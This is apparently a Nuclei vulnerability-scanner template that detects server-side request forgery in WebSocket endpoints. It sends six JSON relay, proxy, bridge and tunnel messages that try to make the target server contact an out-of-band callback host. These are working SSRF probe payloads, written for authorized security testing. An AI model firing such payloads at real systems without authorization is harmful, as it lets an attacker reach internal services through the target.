id: websocket-relay-oob
info:
  author: geeknik
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
    cvss-score: 8.2
    cwe-id: CWE-918
  description: 'Detects WebSocket endpoints that relay or proxy messages to external
    services,

    potentially allowing SSRF through WebSocket message forwarding, bridge connections,

    or relay functionality that can be abused to reach internal services.

    '
  name: WebSocket Message Relay OOB Detection
  reference:
  - https://portswigger.net/web-security/websockets/what-are-websockets
  - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets
  severity: high
  tags: websocket,oob,ssrf,relay,proxy,bridge
matchers:
- condition: or
  part: interactsh_protocol
  type: word
  words:
  - http
  - dns
variables:
  callback_url: '{{interactsh-url}}'
websocket:
- address: '{{BaseURL}}'
  inputs:
  - data: "{\n  \"type\": \"relay\",\n  \"target\": \"{{callback_url}}\",\n  \"relay_to\"\
      : \"{{callback_url}}/endpoint\",\n  \"forward_url\": \"{{callback_url}}/webhook\"\
      \n}\n"
  - data: "{\n  \"action\": \"message_relay\",\n  \"relay_config\": {\n    \"url\"\
      : \"{{callback_url}}\",\n    \"method\": \"GET\",\n    \"headers\": {\"User-Agent\"\
      : \"WebSocket-Relay\"}\n  }\n}\n"
  - data: "{\n  \"command\": \"bridge_setup\",\n  \"bridge_config\": {\n    \"upstream\"\
      : \"{{callback_url}}\",\n    \"downstream\": \"ws://{{callback_url}}/ws\",\n\
      \    \"proxy_headers\": true\n  }\n}\n"
  path:
  - /ws
  - /websocket
  - /socket.io/
  - /api/ws
  - /bridge
  - /tunnel
- address: '{{BaseURL}}'
  inputs:
  - data: "{\n  \"type\": \"proxy_config\",\n  \"proxy_target\": \"{{callback_url}}\"\
      ,\n  \"webhook_url\": \"{{callback_url}}/callback\",\n  \"forward_all\": true,\n\
      \  \"external_relay\": \"{{callback_url}}/relay\"\n}\n"
  - data: "{\n  \"action\": \"external_connect\",\n  \"external_ws\": \"wss://{{callback_url}}/ws\"\
      ,\n  \"relay_messages\": true,\n  \"callback_on_connect\": \"{{callback_url}}/connected\"\
      \n}\n"
  - data: "{\n  \"command\": \"tunnel_create\",\n  \"tunnel_target\": \"{{callback_url}}\"\
      ,\n  \"callback_url\": \"{{callback_url}}/tunnel-ready\"\n}\n"
  path:
  - /ws/proxy
  - /websocket/forward
  - /api/ws/tunnel
